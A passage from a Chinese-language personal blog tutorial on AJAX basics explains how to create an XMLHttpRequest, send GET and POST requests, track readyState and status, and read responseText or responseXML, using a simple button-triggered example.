<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function loadXMLDoc()</span><br><span class="line">&#123;</span><br><span class="line">	var xmlhttp;</span><br><span class="line">	if (window.XMLHttpRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; IE6, IE5 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">	&#123;</span><br><span class="line">		if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">           document.getElementById(&quot;myDiv&quot;).innerHTML&#x3D;xmlhttp.responseText;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	xmlhttp.open(&quot;GET&quot;,&quot;&#x2F;try&#x2F;ajax&#x2F;ajax_info.txt&quot;,true);</span><br><span class="line">	xmlhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;myDiv&quot;&gt;&lt;h2&gt;使用 AJAX 修改该文本内容&lt;&#x2F;h2&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;button type&#x3D;&quot;button&quot; onclick&#x3D;&quot;loadXMLDoc()&quot;&gt;修改内容&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>是不是感觉多的一批，没事，我们慢慢来分析。</p>
<h4 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var xmlhttp;</span><br><span class="line">	if (window.XMLHttpRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F;  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; IE6, IE5 浏览器执行代码</span><br><span class="line">		xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/2.png" alt="2"></p>
<h4 id="向服务器发送请求"><a href="#向服务器发送请求" class="headerlink" title="向服务器发送请求"></a>向服务器发送请求</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;&#x2F;try&#x2F;ajax&#x2F;ajax_info.txt&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/3.png" alt="3"></p>
<p>对于GET请求：</p>
<ol>
<li>如果希望AJAX不用缓存数据以避免数据更新不及时，可给URL添加唯一ID<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/4.png" alt="4"></li>
<li>如果希望AJAX希望通过GET发送信息，可在URL尾部添加信息<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/5.png" alt="5"></li>
</ol>
<p>对于POST请求：</p>
<ol>
<li>如果希望通过POST上传数据，使用 setRequestHeader() 来添加 HTTP 头。然后在 send() 方法中规定您希望发送的数据<img src="/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/6.png" alt="6"></li>
</ol>
<p>当使用 async=true 时，请规定在响应处于 <strong>onreadystatechange</strong> 事件中的就绪状态时执行的函数</p>
<h4 id="onreadystatechange-事件"><a href="#onreadystatechange-事件" class="headerlink" title="onreadystatechange 事件"></a>onreadystatechange 事件</h4><table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>onreadystatechange</td>
<td>存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。</td>
</tr>
<tr>
<td>readyState</td>
<td>存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。0: 请求未初始化   1: 服务器连接已建立   2: 请求已接收   3: 请求处理中   4: 请求已完成，且响应已就绪</td>
</tr>
<tr>
<td>status</td>
<td>200: “OK”     404: 未找到页面</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class="line">	&#123;</span><br><span class="line">		if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">		&#123;</span><br><span class="line">             document.getElementById(&quot;myDiv&quot;).innerHTML&#x3D;xmlhttp.responseText;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="服务器响应"><a href="#服务器响应" class="headerlink" title="服务器响应"></a>服务器响应</h4><p>如需获得来自服务器的响应，请使用 XMLHttpRequest 对象的 responseText 或 responseXML 属性。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>responseText</td>
<td>获得字符串形式的响应数据。</td>
</tr>
<tr>
<td>responseXML</td>
<td>获得 XML 形式的响应数据。</td>
</tr>
</tbody></table>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><a href="https://www.runoob.com/ajax/ajax-examples.html" target="_blank" rel="noopener">戳这里</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/5/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>